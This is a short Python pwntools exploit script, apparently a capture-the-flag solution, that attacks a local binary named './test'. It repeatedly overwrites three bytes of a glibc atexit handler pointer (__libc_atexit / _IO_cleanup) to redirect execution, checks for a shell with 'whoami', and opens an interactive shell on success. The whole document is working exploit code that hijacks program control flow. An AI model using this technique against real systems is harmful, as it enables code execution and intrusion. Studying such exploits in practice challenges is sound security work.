#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

flag = False
while not flag :
    r = process('./test')

    r.sendline(str(0x21000))
    r.sendline('+')

    offset = 0x20f5f8 # __elf_set___libc_atexit_element__IO_cleanup__
    value = 0x3fac7e
    for i in range(3):
        data = str(offset+i) + ' ' + str((value >> (8*i)) & 0xff)
        r.sendline(data)

    r.sendline('A')
    try:
        r.sendline('whoami')
        data = r.recv()
        if b'stack' in data or b'glibc' in data or b'free' in data:
            r.close()
            continue
        r.interactive()
        flag = True
    except:
        r.close()